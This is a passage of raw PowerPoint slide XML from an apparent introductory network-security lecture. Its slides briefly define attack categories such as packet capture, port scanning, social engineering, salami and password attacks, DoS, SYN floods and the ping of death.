                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="111240" rIns="68760" tIns="111240" bIns="110880" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="ffffff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Maintaining access</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="328" name="CustomShape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2724840" y="2417040"/>
            <a:ext cx="3464640" cy="3464640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="1732769" h="2509593">
                <a:moveTo>
                  <a:pt x="183888" y="2509594"/>
                </a:moveTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="4f81bd">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
            <a:tailEnd len="med" type="arrow" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="329" name="CustomShape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2142720" y="3180960"/>
            <a:ext cx="1333440" cy="866520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="ffffff">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="111240" rIns="68760" tIns="111240" bIns="110880" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="ffffff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Covering tracks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="330" name="CustomShape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2905920" y="2666520"/>
            <a:ext cx="3464640" cy="3464640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="1732769" h="1732768">
                <a:moveTo>
                  <a:pt x="582035" y="437276"/>
                </a:moveTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="4f81bd">
                <a:hueOff val="0"/>
                <a:satOff val="0"/>
                <a:lumOff val="0"/>
                <a:alphaOff val="0"/>
              </a:srgbClr>
            </a:solidFill>
            <a:round/>
            <a:tailEnd len="med" type="arrow" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>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Types of Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="332" name="Picture 4" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219320" y="1752480"/>
            <a:ext cx="6324120" cy="4419360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">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Confidentiality Attack</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="334"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000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>A conﬁdentiality attack attempts to make “conﬁdential” data (such as personnel records, usernames, passwords, credit card numbers, and e-mails) viewable by an attacker.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="335" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="2895480"/>
            <a:ext cx="5764320" cy="3733200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="936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Confidentiality Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Packet capture</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A packet-capture utility can capture packets visible by a PC’s network interface card (NIC) by placing the NIC in </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0000ff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>promiscuous</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> mode.</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Some protocols (for example, Telnet and HTTP) are sent in plain text. Therefore, an attacker can read these types of captured packets, perhaps allowing him to see confidential information.</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Example: Wireshark, TCPdump</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Confidentiality Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33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438840" indent="-319680">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Ping sweep</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="731520" indent="-273960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>A confidentiality attack might begin with a scan of network resources, to identify attack targets on a network. </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="731520" indent="-273960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>A ping sweep could be used to ping a series of IP addresses. </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="731520" indent="-273960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Ping replies might indicate to an attacker that network resources can be reached at those IP addresses. </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Confidentiality Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Port scan</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>A potential target computer runs many 'services' that listen at ‘well-known’ 'ports</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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The attacker might scan a range of UDP and/or TCP ports to see what services are available on the host at the specified IP addresses. </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Port Scanning Techniques:</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228240">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Open scan</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228240">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Half- open scan</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228240">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>SYN/ACK Scan </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228240">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>FIN Scan</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228240">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>UDP Scanning</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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Confidentiality Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Dumpster diving</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Because many companies throw away confidential information, without proper shredding, some attackers rummage through company dumpsters in hopes of discovering information that could be used to compromise network resources.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Confidentiality Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="345"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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Social Engineering</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Attackers sometimes use social techniques (which often leverage people’s desire to be helpful) to obtain confidential information.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Types</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228240">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0000ff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Human-based Social Engineering</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228240">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0000ff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Computer based Social Engineering </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Confidentiality Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Reverse Social Engineering</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>More advanced method of gaining illicit information</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285480">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>The hacker creates a persona that appears to be in a position of authority so that employees will ask him for information, rather than the other way around.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Integrity Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="349" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7771680" cy="4342680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="350" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="762120" y="2057400"/>
            <a:ext cx="6504840" cy="3513960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="936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Integrity Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="352"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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Salami attack</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This is a collection of small attacks that result in a larger attack when combined. </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Example, if an attacker had a collection of stolen credit card numbers, he could withdraw small amounts of money from each credit card (possibly unnoticed by the credit card holders). Although each withdrawal is small, they add up to a significant sum for the attacker.</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Integrity Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="354"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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Password attack</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Trojan horse</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Packet capture</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Key logger</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Brute force attack</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Dictionary attack</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105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Availability Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="356"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438840" indent="-319680">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings 2" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Denial of service (DoS)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="357" name="Picture 1" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1295280" y="2362320"/>
            <a:ext cx="6771600" cy="2524680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="936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Availability Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Distributed denial of service (DDoS)</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DDoS attacks can increase the amount of traffic flooded to a target system.</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Zombies.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Availability Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>TCP SYN flood</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One variant of a DoS attack is for an attacker to initiate multiple TCP sessions by sending SYN segments but never completing the three-way handshake. </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Because many servers limit the number of TCP sessions they can have open simultaneously, a SYN flood can render a target system incapable of opening a TCP session with a legitimate user.</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Availability Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>ICMP attacks</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ICMP DoS attack variant called “</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="ffffff"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>the ping of death</a:t>
